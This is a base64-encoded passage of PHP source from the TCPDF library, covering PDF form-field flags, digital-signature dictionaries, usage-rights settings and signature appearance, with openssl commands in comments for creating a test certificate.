dIC49ICcgJy4kdGhpcy0+X3RleHRzdHJpbmcoJGZpZWxkLCAkYW5uX29ial9pZCk7CgkJCQkJCX0KCQkJCQkJJG9wdFsnYWEnXSAuPSAnXSc7CgkJCQkJfSBlbHNlaWYgKCgka2V5ID09ICdGbGFncycpKSB7CgkJCQkJCSRmZiA9IDA7CgkJCQkJCWlmIChpc19hcnJheSgkdmFsKSkgewoJCQkJCQkJZm9yZWFjaCAoJHZhbCBBUyAkZmxhZykgewoJCQkJCQkJCXN3aXRjaCAoJGZsYWcpIHsKCQkJCQkJCQkJY2FzZSAnSW5jbHVkZS9FeGNsdWRlJzogewoJCQkJCQkJCQkJJGZmICs9IDEgPDwgMDsKCQkJCQkJCQkJCWJyZWFrOwoJCQkJCQkJCQl9CgkJCQkJCQkJCWNhc2UgJ0luY2x1ZGVOb1ZhbHVlRmllbGRzJzogewoJCQkJCQkJCQkJJGZmICs9IDEgPDwgMTsKCQkJCQkJCQkJCWJyZWFrOwoJCQkJCQkJCQl9CgkJCQkJCQkJCWNhc2UgJ0V4cG9ydEZvcm1hdCc6IHsKCQkJCQkJCQkJCSRmZiArPSAxIDw8IDI7CgkJCQkJCQkJCQlicmVhazsKCQkJCQkJCQkJfQoJCQkJCQkJCQljYXNlICdHZXRNZXRob2QnOiB7CgkJCQkJCQkJCQkkZmYgKz0gMSA8PCAzOwoJCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJCX0KCQkJCQkJCQkJY2FzZSAnU3VibWl0Q29vcmRpbmF0ZXMnOiB7CgkJCQkJCQkJCQkkZmYgKz0gMSA8PCA0OwoJCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJCX0KCQkJCQkJCQkJY2FzZSAnWEZERic6IHsKCQkJCQkJCQkJCSRmZiArPSAxIDw8IDU7CgkJCQkJCQkJCQlicmVhazsKCQkJCQkJCQkJfQoJCQkJCQkJCQljYXNlICdJbmNsdWRlQXBwZW5kU2F2ZXMnOiB7CgkJCQkJCQkJCQkkZmYgKz0gMSA8PCA2OwoJCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJCX0KCQkJCQkJCQkJY2FzZSAnSW5jbHVkZUFubm90YXRpb25zJzogewoJCQkJCQkJCQkJJGZmICs9IDEgPDwgNzsKCQkJCQkJCQkJCWJyZWFrOwoJCQkJCQkJCQl9CgkJCQkJCQkJCWNhc2UgJ1N1Ym1pdFBERic6IHsKCQkJCQkJCQkJCSRmZiArPSAxIDw8IDg7CgkJCQkJCQkJCQlicmVhazsKCQkJCQkJCQkJfQoJCQkJCQkJCQljYXNlICdDYW5vbmljYWxGb3JtYXQnOiB7CgkJCQkJCQkJCQkkZmYgKz0gMSA8PCA5OwoJCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJCX0KCQkJCQkJCQkJY2FzZSAnRXhjbE5vblVzZXJBbm5vdHMnOiB7CgkJCQkJCQkJCQkkZmYgKz0gMSA8PCAxMDsKCQkJCQkJCQkJCWJyZWFrOwoJCQkJCQkJCQl9CgkJCQkJCQkJCWNhc2UgJ0V4Y2xGS2V5JzogewoJCQkJCQkJCQkJJGZmICs9IDEgPDwgMTE7CgkJCQkJCQkJCQlicmVhazsKCQkJCQkJCQkJfQoJCQkJCQkJCQljYXNlICdFbWJlZEZvcm0nOiB7CgkJCQkJCQkJCQkkZmYgKz0gMSA8PCAxMzsKCQkJCQkJCQkJCWJyZWFrOwoJCQkJCQkJCQl9CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJGZmID0gaW50dmFsKCR2YWwpOwoJCQkJCQl9CgkJCQkJCSRvcHRbJ2FhJ10gLj0gJyAvRmxhZ3MgJy4kZmY7CgkJCQkJfQoJCQkJfQoJCQkJJG9wdFsnYWEnXSAuPSAnID4+JzsKCQkJfSBlbHNlIHsKCQkJCS8vIEphdmFzY3JpcHQgYWN0aW9uIG9yIHJhdyBhY3Rpb24gY29tbWFuZAoJCQkJJGpzX29ial9pZCA9ICR0aGlzLT5hZGRKYXZhc2NyaXB0T2JqZWN0KCRhY3Rpb24pOwoJCQkJJG9wdFsnYWEnXSA9ICcvRCAnLiRqc19vYmpfaWQuJyAwIFInOwoJCQl9CgkJfQoJCSR0aGlzLT5Bbm5vdGF0aW9uKCR4LCAkeSwgJHcsICRoLCAkbmFtZSwgJG9wdCwgMCk7CgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJJHRoaXMtPnggLT0gJHc7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPnggKz0gJHc7CgkJfQoJfQoKCS8vIC0tLSBFTkQgRk9STVMgRklFTERTIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKCS8qKgoJICogQWRkIGNlcnRpZmljYXRpb24gc2lnbmF0dXJlIChEb2NNRFAgb3IgVVIzKQoJICogWW91IGNhbiBzZXQgb25seSBvbmUgc2lnbmF0dXJlIHR5cGUKCSAqIEBwcm90ZWN0ZWQKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNC42LjAwOCAoMjAwOS0wNS0wNykKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9wdXRzaWduYXR1cmUoKSB7CgkJaWYgKCghJHRoaXMtPnNpZ24pIE9SICghaXNzZXQoJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydjZXJ0X3R5cGUnXSkpKSB7CgkJCXJldHVybjsKCQl9CgkJJHNpZ29iamlkID0gKCR0aGlzLT5zaWdfb2JqX2lkICsgMSk7CgkJJG91dCA9ICR0aGlzLT5fZ2V0b2JqKCRzaWdvYmppZCkuIlxuIjsKCQkkb3V0IC49ICc8PCAvVHlwZSAvU2lnJzsKCQkkb3V0IC49ICcgL0ZpbHRlciAvQWRvYmUuUFBLTGl0ZSc7CgkJJG91dCAuPSAnIC9TdWJGaWx0ZXIgL2FkYmUucGtjczcuZGV0YWNoZWQnOwoJCSRvdXQgLj0gJyAnLlRDUERGX1NUQVRJQzo6JGJ5dGVyYW5nZV9zdHJpbmc7CgkJJG91dCAuPSAnIC9Db250ZW50czwnLnN0cl9yZXBlYXQoJzAnLCAkdGhpcy0+c2lnbmF0dXJlX21heF9sZW5ndGgpLic+JzsKCQlpZiAoZW1wdHkoJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydhcHByb3ZhbCddKSBPUiAoJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydhcHByb3ZhbCddICE9ICdBJykpIHsKCQkJJG91dCAuPSAnIC9SZWZlcmVuY2UgWyc7IC8vIGFycmF5IG9mIHNpZ25hdHVyZSByZWZlcmVuY2UgZGljdGlvbmFyaWVzCgkJCSRvdXQgLj0gJyA8PCAvVHlwZSAvU2lnUmVmJzsKCQkJaWYgKCR0aGlzLT5zaWduYXR1cmVfZGF0YVsnY2VydF90eXBlJ10gPiAwKSB7CgkJCQkkb3V0IC49ICcgL1RyYW5zZm9ybU1ldGhvZCAvRG9jTURQJzsKCQkJCSRvdXQgLj0gJyAvVHJhbnNmb3JtUGFyYW1zIDw8JzsKCQkJCSRvdXQgLj0gJyAvVHlwZSAvVHJhbnNmb3JtUGFyYW1zJzsKCQkJCSRvdXQgLj0gJyAvUCAnLiR0aGlzLT5zaWduYXR1cmVfZGF0YVsnY2VydF90eXBlJ107CgkJCQkkb3V0IC49ICcgL1YgLzEuMic7CgkJCX0gZWxzZSB7CgkJCQkkb3V0IC49ICcgL1RyYW5zZm9ybU1ldGhvZCAvVVIzJzsKCQkJCSRvdXQgLj0gJyAvVHJhbnNmb3JtUGFyYW1zIDw8JzsKCQkJCSRvdXQgLj0gJyAvVHlwZSAvVHJhbnNmb3JtUGFyYW1zJzsKCQkJCSRvdXQgLj0gJyAvViAvMi4yJzsKCQkJCWlmICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRoaXMtPnVyWydkb2N1bWVudCddKSkgewoJCQkJCSRvdXQgLj0gJyAvRG9jdW1lbnRbJy4kdGhpcy0+dXJbJ2RvY3VtZW50J10uJ10nOwoJCQkJfQoJCQkJaWYgKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdGhpcy0+dXJbJ2Zvcm0nXSkpIHsKCQkJCQkkb3V0IC49ICcgL0Zvcm1bJy4kdGhpcy0+dXJbJ2Zvcm0nXS4nXSc7CgkJCQl9CgkJCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR0aGlzLT51clsnc2lnbmF0dXJlJ10pKSB7CgkJCQkJJG91dCAuPSAnIC9TaWduYXR1cmVbJy4kdGhpcy0+dXJbJ3NpZ25hdHVyZSddLiddJzsKCQkJCX0KCQkJCWlmICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRoaXMtPnVyWydhbm5vdHMnXSkpIHsKCQkJCQkkb3V0IC49ICcgL0Fubm90c1snLiR0aGlzLT51clsnYW5ub3RzJ10uJ10nOwoJCQkJfQoJCQkJaWYgKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdGhpcy0+dXJbJ2VmJ10pKSB7CgkJCQkJJG91dCAuPSAnIC9FRlsnLiR0aGlzLT51clsnZWYnXS4nXSc7CgkJCQl9CgkJCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR0aGlzLT51clsnZm9ybWV4J10pKSB7CgkJCQkJJG91dCAuPSAnIC9Gb3JtRVhbJy4kdGhpcy0+dXJbJ2Zvcm1leCddLiddJzsKCQkJCX0KCQkJfQoJCQkkb3V0IC49ICcgPj4nOyAvLyBjbG9zZSBUcmFuc2Zvcm1QYXJhbXMKCQkJLy8gb3B0aW9uYWwgZGlnZXN0IGRhdGEgKHZhbHVlcyBtdXN0IGJlIGNhbGN1bGF0ZWQgYW5kIHJlcGxhY2VkIGxhdGVyKQoJCQkvLyRvdXQgLj0gJyAvRGF0YSAqKioqKioqKioqIDAgUic7CgkJCS8vJG91dCAuPSAnIC9EaWdlc3RNZXRob2QvTUQ1JzsKCQkJLy8kb3V0IC49ICcgL0RpZ2VzdExvY2F0aW9uWyoqKioqKioqKiogMzRdJzsKCQkJLy8kb3V0IC49ICcgL0RpZ2VzdFZhbHVlPCoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqPic7CgkJCSRvdXQgLj0gJyA+Pic7CgkJCSRvdXQgLj0gJyBdJzsgLy8gZW5kIG9mIHJlZmVyZW5jZQoJCX0KCQlpZiAoaXNzZXQoJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydpbmZvJ11bJ05hbWUnXSkgQU5EICFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ2luZm8nXVsnTmFtZSddKSkgewoJCQkkb3V0IC49ICcgL05hbWUgJy4kdGhpcy0+X3RleHRzdHJpbmcoJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydpbmZvJ11bJ05hbWUnXSwgJHNpZ29iamlkKTsKCQl9CgkJaWYgKGlzc2V0KCR0aGlzLT5zaWduYXR1cmVfZGF0YVsnaW5mbyddWydMb2NhdGlvbiddKSBBTkQgIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR0aGlzLT5zaWduYXR1cmVfZGF0YVsnaW5mbyddWydMb2NhdGlvbiddKSkgewoJCQkkb3V0IC49ICcgL0xvY2F0aW9uICcuJHRoaXMtPl90ZXh0c3RyaW5nKCR0aGlzLT5zaWduYXR1cmVfZGF0YVsnaW5mbyddWydMb2NhdGlvbiddLCAkc2lnb2JqaWQpOwoJCX0KCQlpZiAoaXNzZXQoJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydpbmZvJ11bJ1JlYXNvbiddKSBBTkQgIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR0aGlzLT5zaWduYXR1cmVfZGF0YVsnaW5mbyddWydSZWFzb24nXSkpIHsKCQkJJG91dCAuPSAnIC9SZWFzb24gJy4kdGhpcy0+X3RleHRzdHJpbmcoJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydpbmZvJ11bJ1JlYXNvbiddLCAkc2lnb2JqaWQpOwoJCX0KCQlpZiAoaXNzZXQoJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydpbmZvJ11bJ0NvbnRhY3RJbmZvJ10pIEFORCAhVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydpbmZvJ11bJ0NvbnRhY3RJbmZvJ10pKSB7CgkJCSRvdXQgLj0gJyAvQ29udGFjdEluZm8gJy4kdGhpcy0+X3RleHRzdHJpbmcoJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydpbmZvJ11bJ0NvbnRhY3RJbmZvJ10sICRzaWdvYmppZCk7CgkJfQoJCSRvdXQgLj0gJyAvTSAnLiR0aGlzLT5fZGF0ZXN0cmluZygkc2lnb2JqaWQsICR0aGlzLT5kb2NfbW9kaWZpY2F0aW9uX3RpbWVzdGFtcCk7CgkJJG91dCAuPSAnID4+JzsKCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJJHRoaXMtPl9vdXQoJG91dCk7Cgl9CgoJLyoqCgkgKiBTZXQgVXNlcidzIFJpZ2h0cyBmb3IgUERGIFJlYWRlcgoJICogV0FSTklORzogVGhpcyBpcyBleHBlcmltZW50YWwgYW5kIGN1cnJlbnRseSBkbyBub3Qgd29yay4KCSAqIENoZWNrIHRoZSBQREYgUmVmZXJlbmNlIDguNy4xIFRyYW5zZm9ybSBNZXRob2RzLAoJICogVGFibGUgOC4xMDUgRW50cmllcyBpbiB0aGUgVVIgdHJhbnNmb3JtIHBhcmFtZXRlcnMgZGljdGlvbmFyeQoJICogQHBhcmFtIGJvb2xlYW4gJGVuYWJsZSBpZiB0cnVlIGVuYWJsZSB1c2VyJ3MgcmlnaHRzIG9uIFBERiByZWFkZXIKCSAqIEBwYXJhbSBzdHJpbmcgJGRvY3VtZW50IE5hbWVzIHNwZWNpZnlpbmcgYWRkaXRpb25hbCBkb2N1bWVudC13aWRlIHVzYWdlIHJpZ2h0cyBmb3IgdGhlIGRvY3VtZW50LiBUaGUgb25seSBkZWZpbmVkIHZhbHVlIGlzICIvRnVsbFNhdmUiLCB3aGljaCBwZXJtaXRzIGEgdXNlciB0byBzYXZlIHRoZSBkb2N1bWVudCBhbG9uZyB3aXRoIG1vZGlmaWVkIGZvcm0gYW5kL29yIGFubm90YXRpb24gZGF0YS4KCSAqIEBwYXJhbSBzdHJpbmcgJGFubm90cyBOYW1lcyBzcGVjaWZ5aW5nIGFkZGl0aW9uYWwgYW5ub3RhdGlvbi1yZWxhdGVkIHVzYWdlIHJpZ2h0cyBmb3IgdGhlIGRvY3VtZW50LiBWYWxpZCBuYW1lcyBpbiBQREYgMS41IGFuZCBsYXRlciBhcmUgL0NyZWF0ZS9EZWxldGUvTW9kaWZ5L0NvcHkvSW1wb3J0L0V4cG9ydCwgd2hpY2ggcGVybWl0IHRoZSB1c2VyIHRvIHBlcmZvcm0gdGhlIG5hbWVkIG9wZXJhdGlvbiBvbiBhbm5vdGF0aW9ucy4KCSAqIEBwYXJhbSBzdHJpbmcgJGZvcm0gTmFtZXMgc3BlY2lmeWluZyBhZGRpdGlvbmFsIGZvcm0tZmllbGQtcmVsYXRlZCB1c2FnZSByaWdodHMgZm9yIHRoZSBkb2N1bWVudC4gVmFsaWQgbmFtZXMgYXJlOiAvQWRkL0RlbGV0ZS9GaWxsSW4vSW1wb3J0L0V4cG9ydC9TdWJtaXRTdGFuZGFsb25lL1NwYXduVGVtcGxhdGUKCSAqIEBwYXJhbSBzdHJpbmcgJHNpZ25hdHVyZSBOYW1lcyBzcGVjaWZ5aW5nIGFkZGl0aW9uYWwgc2lnbmF0dXJlLXJlbGF0ZWQgdXNhZ2UgcmlnaHRzIGZvciB0aGUgZG9jdW1lbnQuIFRoZSBvbmx5IGRlZmluZWQgdmFsdWUgaXMgL01vZGlmeSwgd2hpY2ggcGVybWl0cyBhIHVzZXIgdG8gYXBwbHkgYSBkaWdpdGFsIHNpZ25hdHVyZSB0byBhbiBleGlzdGluZyBzaWduYXR1cmUgZm9ybSBmaWVsZCBvciBjbGVhciBhIHNpZ25lZCBzaWduYXR1cmUgZm9ybSBmaWVsZC4KCSAqIEBwYXJhbSBzdHJpbmcgJGVmIE5hbWVzIHNwZWNpZnlpbmcgYWRkaXRpb25hbCB1c2FnZSByaWdodHMgZm9yIG5hbWVkIGVtYmVkZGVkIGZpbGVzIGluIHRoZSBkb2N1bWVudC4gVmFsaWQgbmFtZXMgYXJlIC9DcmVhdGUvRGVsZXRlL01vZGlmeS9JbXBvcnQsIHdoaWNoIHBlcm1pdCB0aGUgdXNlciB0byBwZXJmb3JtIHRoZSBuYW1lZCBvcGVyYXRpb24gb24gbmFtZWQgZW1iZWRkZWQgZmlsZXMKCSBOYW1lcyBzcGVjaWZ5aW5nIGFkZGl0aW9uYWwgZW1iZWRkZWQtZmlsZXMtcmVsYXRlZCB1c2FnZSByaWdodHMgZm9yIHRoZSBkb2N1bWVudC4KCSAqIEBwYXJhbSBzdHJpbmcgJGZvcm1leCBOYW1lcyBzcGVjaWZ5aW5nIGFkZGl0aW9uYWwgZm9ybS1maWVsZC1yZWxhdGVkIHVzYWdlIHJpZ2h0cy4gVGhlIG9ubHkgdmFsaWQgbmFtZSBpcyBCYXJjb2RlUGxhaW50ZXh0LCB3aGljaCBwZXJtaXRzIHRleHQgZm9ybSBmaWVsZCBkYXRhIHRvIGJlIGVuY29kZWQgYXMgYSBwbGFpbnRleHQgdHdvLWRpbWVuc2lvbmFsIGJhcmNvZGUuCgkgKiBAcHVibGljCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDIuOS4wMDAgKDIwMDgtMDMtMjYpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRVc2VyUmlnaHRzKAoJCQkkZW5hYmxlPXRydWUsCgkJCSRkb2N1bWVudD0nL0Z1bGxTYXZlJywKCQkJJGFubm90cz0nL0NyZWF0ZS9EZWxldGUvTW9kaWZ5L0NvcHkvSW1wb3J0L0V4cG9ydCcsCgkJCSRmb3JtPScvQWRkL0RlbGV0ZS9GaWxsSW4vSW1wb3J0L0V4cG9ydC9TdWJtaXRTdGFuZGFsb25lL1NwYXduVGVtcGxhdGUnLAoJCQkkc2lnbmF0dXJlPScvTW9kaWZ5JywKCQkJJGVmPScvQ3JlYXRlL0RlbGV0ZS9Nb2RpZnkvSW1wb3J0JywKCQkJJGZvcm1leD0nJykgewoJCSR0aGlzLT51clsnZW5hYmxlZCddID0gJGVuYWJsZTsKCQkkdGhpcy0+dXJbJ2RvY3VtZW50J10gPSAkZG9jdW1lbnQ7CgkJJHRoaXMtPnVyWydhbm5vdHMnXSA9ICRhbm5vdHM7CgkJJHRoaXMtPnVyWydmb3JtJ10gPSAkZm9ybTsKCQkkdGhpcy0+dXJbJ3NpZ25hdHVyZSddID0gJHNpZ25hdHVyZTsKCQkkdGhpcy0+dXJbJ2VmJ10gPSAkZWY7CgkJJHRoaXMtPnVyWydmb3JtZXgnXSA9ICRmb3JtZXg7CgkJaWYgKCEkdGhpcy0+c2lnbikgewoJCQkkdGhpcy0+c2V0U2lnbmF0dXJlKCcnLCAnJywgJycsICcnLCAwLCBhcnJheSgpKTsKCQl9Cgl9CgoJLyoqCgkgKiBFbmFibGUgZG9jdW1lbnQgc2lnbmF0dXJlIChyZXF1aXJlcyB0aGUgT3BlblNTTCBMaWJyYXJ5KS4KCSAqIFRoZSBkaWdpdGFsIHNpZ25hdHVyZSBpbXByb3ZlIGRvY3VtZW50IGF1dGhlbnRpY2l0eSBhbmQgaW50ZWdyaXR5IGFuZCBhbGxvd3MgbyBlbmFibGUgZXh0cmEgZmVhdHVyZXMgb24gQWNyb2JhdCBSZWFkZXIuCgkgKiBUbyBjcmVhdGUgc2VsZi1zaWduZWQgc2lnbmF0dXJlOiBvcGVuc3NsIHJlcSAteDUwOSAtbm9kZXMgLWRheXMgMzY1MDAwIC1uZXdrZXkgcnNhOjEwMjQgLWtleW91dCB0Y3BkZi5jcnQgLW91dCB0Y3BkZi5jcnQKCSAqIFRvIGV4cG9ydCBjcnQgdG8gcDEyOiBvcGVuc3NsIHBrY3MxMiAtZXhwb3J0IC1pbiB0Y3BkZi5jcnQgLW91dCB0Y3BkZi5wMTIKCSAqIFRvIGNvbnZlcnQgcGZ4IGNlcnRpZmljYXRlIHRvIHBlbTogb3BlbnNzbCBwa2NzMTIgLWluIHRjcGRmLnBmeCAtb3V0IHRjcGRmLmNydCAtbm9kZXMKCSAqIEBwYXJhbSBtaXhlZCAkc2lnbmluZ19jZXJ0IHNpZ25pbmcgY2VydGlmaWNhdGUgKHN0cmluZyBvciBmaWxlbmFtZSBwcmVmaXhlZCB3aXRoICdmaWxlOi8vJykKCSAqIEBwYXJhbSBtaXhlZCAkcHJpdmF0ZV9rZXkgcHJpdmF0ZSBrZXkgKHN0cmluZyBvciBmaWxlbmFtZSBwcmVmaXhlZCB3aXRoICdmaWxlOi8vJykKCSAqIEBwYXJhbSBzdHJpbmcgJHByaXZhdGVfa2V5X3Bhc3N3b3JkIHBhc3N3b3JkCgkgKiBAcGFyYW0gc3RyaW5nICRleHRyYWNlcnRzIHNwZWNpZmllcyB0aGUgbmFtZSBvZiBhIGZpbGUgY29udGFpbmluZyBhIGJ1bmNoIG9mIGV4dHJhIGNlcnRpZmljYXRlcyB0byBpbmNsdWRlIGluIHRoZSBzaWduYXR1cmUgd2hpY2ggY2FuIGZvciBleGFtcGxlIGJlIHVzZWQgdG8gaGVscCB0aGUgcmVjaXBpZW50IHRvIHZlcmlmeSB0aGUgY2VydGlmaWNhdGUgdGhhdCB5b3UgdXNlZC4KCSAqIEBwYXJhbSBpbnQgJGNlcnRfdHlwZSBUaGUgYWNjZXNzIHBlcm1pc3Npb25zIGdyYW50ZWQgZm9yIHRoaXMgZG9jdW1lbnQuIFZhbGlkIHZhbHVlcyBzaGFsbCBiZTogMSA9IE5vIGNoYW5nZXMgdG8gdGhlIGRvY3VtZW50IHNoYWxsIGJlIHBlcm1pdHRlZDsgYW55IGNoYW5nZSB0byB0aGUgZG9jdW1lbnQgc2hhbGwgaW52YWxpZGF0ZSB0aGUgc2lnbmF0dXJlOyAyID0gUGVybWl0dGVkIGNoYW5nZXMgc2hhbGwgYmUgZmlsbGluZyBpbiBmb3JtcywgaW5zdGFudGlhdGluZyBwYWdlIHRlbXBsYXRlcywgYW5kIHNpZ25pbmc7IG90aGVyIGNoYW5nZXMgc2hhbGwgaW52YWxpZGF0ZSB0aGUgc2lnbmF0dXJlOyAzID0gUGVybWl0dGVkIGNoYW5nZXMgc2hhbGwgYmUgdGhlIHNhbWUgYXMgZm9yIDIsIGFzIHdlbGwgYXMgYW5ub3RhdGlvbiBjcmVhdGlvbiwgZGVsZXRpb24sIGFuZCBtb2RpZmljYXRpb247IG90aGVyIGNoYW5nZXMgc2hhbGwgaW52YWxpZGF0ZSB0aGUgc2lnbmF0dXJlLgoJICogQHBhcmFtIGFycmF5ICRpbmZvIGFycmF5IG9mIG9wdGlvbiBpbmZvcm1hdGlvbjogTmFtZSwgTG9jYXRpb24sIFJlYXNvbiwgQ29udGFjdEluZm8uCgkgKiBAcGFyYW0gc3RyaW5nICRhcHByb3ZhbCBFbmFibGUgYXBwcm92YWwgc2lnbmF0dXJlIGVnLiBmb3IgUERGIGluY3JlbWVudGFsIHVwZGF0ZQoJICogQHB1YmxpYwoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSA0LjYuMDA1ICgyMDA5LTA0LTI0KQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0U2lnbmF0dXJlKCRzaWduaW5nX2NlcnQ9JycsICRwcml2YXRlX2tleT0nJywgJHByaXZhdGVfa2V5X3Bhc3N3b3JkPScnLCAkZXh0cmFjZXJ0cz0nJywgJGNlcnRfdHlwZT0yLCAkaW5mbz1hcnJheSgpLCAkYXBwcm92YWw9JycpIHsKCQkvLyB0byBjcmVhdGUgc2VsZi1zaWduZWQgc2lnbmF0dXJlOiBvcGVuc3NsIHJlcSAteDUwOSAtbm9kZXMgLWRheXMgMzY1MDAwIC1uZXdrZXkgcnNhOjEwMjQgLWtleW91dCB0Y3BkZi5jcnQgLW91dCB0Y3BkZi5jcnQKCQkvLyB0byBleHBvcnQgY3J0IHRvIHAxMjogb3BlbnNzbCBwa2NzMTIgLWV4cG9ydCAtaW4gdGNwZGYuY3J0IC1vdXQgdGNwZGYucDEyCgkJLy8gdG8gY29udmVydCBwZnggY2VydGlmaWNhdGUgdG8gcGVtOiBvcGVuc3NsCgkJLy8gICAgIE9wZW5TU0w+IHBrY3MxMiAtaW4gPGNlcnQucGZ4PiAtb3V0IDxjZXJ0LmNydD4gLW5vZGVzCgkJJHRoaXMtPnNpZ24gPSB0cnVlOwoJCSsrJHRoaXMtPm47CgkJJHRoaXMtPnNpZ19vYmpfaWQgPSAkdGhpcy0+bjsgLy8gc2lnbmF0dXJlIHdpZGdldAoJCSsrJHRoaXMtPm47IC8vIHNpZ25hdHVyZSBvYmplY3QgKCR0aGlzLT5zaWdfb2JqX2lkICsgMSkKCQkkdGhpcy0+c2lnbmF0dXJlX2RhdGEgPSBhcnJheSgpOwoJCWlmIChzdHJsZW4oJHNpZ25pbmdfY2VydCkgPT0gMCkgewoJCQkkdGhpcy0+RXJyb3IoJ1BsZWFzZSBwcm92aWRlIGEgY2VydGlmaWNhdGUgZmlsZSBhbmQgcGFzc3dvcmQhJyk7CgkJfQoJCWlmIChzdHJsZW4oJHByaXZhdGVfa2V5KSA9PSAwKSB7CgkJCSRwcml2YXRlX2tleSA9ICRzaWduaW5nX2NlcnQ7CgkJfQoJCSR0aGlzLT5zaWduYXR1cmVfZGF0YVsnc2lnbmNlcnQnXSA9ICRzaWduaW5nX2NlcnQ7CgkJJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydwcml2a2V5J10gPSAkcHJpdmF0ZV9rZXk7CgkJJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydwYXNzd29yZCddID0gJHByaXZhdGVfa2V5X3Bhc3N3b3JkOwoJCSR0aGlzLT5zaWduYXR1cmVfZGF0YVsnZXh0cmFjZXJ0cyddID0gJGV4dHJhY2VydHM7CgkJJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydjZXJ0X3R5cGUnXSA9ICRjZXJ0X3R5cGU7CgkJJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydpbmZvJ10gPSAkaW5mbzsKCQkkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ2FwcHJvdmFsJ10gPSAkYXBwcm92YWw7Cgl9CgoJLyoqCgkgKiBTZXQgdGhlIGRpZ2l0YWwgc2lnbmF0dXJlIGFwcGVhcmFuY2UgKGEgY2xpY2NhYmxlIHJlY3RhbmdsZSBhcmVhIHRvIGdldCBzaWduYXR1cmUgcHJvcGVydGllcykKCSAqIEBwYXJhbSBmbG9hdCAkeCBBYnNjaXNzYSBvZiB0aGUgdXBwZXItbGVmdCBjb3JuZXIuCgkgKiBAcGFyYW0gZmxvYXQgJHkgT3JkaW5hdGUgb2YgdGhlIHVwcGVyLWxlZnQgY29ybmVyLgoJICogQHBhcmFtIGZsb2F0ICR3IFdpZHRoIG9mIHRoZSBzaWduYXR1cmUgYXJlYS4KCSAqIEBwYXJhbSBmbG9hdCAkaCBIZWlnaHQgb2YgdGhlIHNpZ25hdHVyZSBhcmVhLgoJICogQHBhcmFtIGludCAkcGFnZSBvcHRpb24gcGFnZSBudW1iZXIgKGlmIDwgMCB0aGUgY3VycmVudCBwYWdlIGlzIHVzZWQpLgoJICogQHBhcmFtIHN0cmluZyAkbmFtZSBOYW1lIG9mIHRoZSBzaWduYXR1cmUuCgkgKiBAcHVibGljCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDUuMy4wMTEgKDIwMTAtMDYtMTcpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRTaWduYXR1cmVBcHBlYXJhbmNlKCR4PTAsICR5PTAsICR3PTAsICRoPTAsICRwYWdlPS0xLCAkbmFtZT0nJykgewoJCSR0aGlzLT5zaWduYXR1cmVfYXBwZWFyYW5jZSA9ICR0aGlzLT5nZXRTaWduYXR1cmVBcHBlYXJhbmNlQXJyYXkoJHgsICR5LCAkdywgJGgsICRwYWdlLCAkbmFtZSk7Cgl9CgoJLyoqCgkgKiBBZGQgYW4gZW1wdHkgZGlnaXRhbCBzaWduYXR1cmUgYXBwZWFyYW5jZSAoYSBjbGljY2FibGUgcmVjdGFuZ2xlIGFyZWEgdG8gZ2V0IHNpZ25hdHVyZSBwcm9wZXJ0aWVzKQoJICogQHBhcmFtIGZsb2F0ICR4IEFic2Npc3NhIG9mIHRoZSB1cHBlci1sZWZ0IGNvcm5lci4KCSAqIEBwYXJhbSBmbG9hdCAkeSBPcmRpbmF0ZSBvZiB0aGUgdXBwZXItbGVmdCBjb3JuZXIuCgkgKiBAcGFyYW0gZmxvYXQgJHcgV2lkdGggb2YgdGhlIHNpZ25hdHVyZSBhcmVhLgoJICogQHBhcmFtIGZsb2F0ICRoIEhlaWdodCBvZiB0aGUgc2lnbmF0dXJlIGFyZWEuCgkgKiBAcGFyYW0gaW50ICRwYWdlIG9wdGlvbiBwYWdlIG51bWJlciAoaWYgPCAwIHRoZSBjdXJyZW50IHBhZ2UgaXMgdXNlZCkuCgkgKiBAcGFyYW0gc3RyaW5nICRuYW1lIE5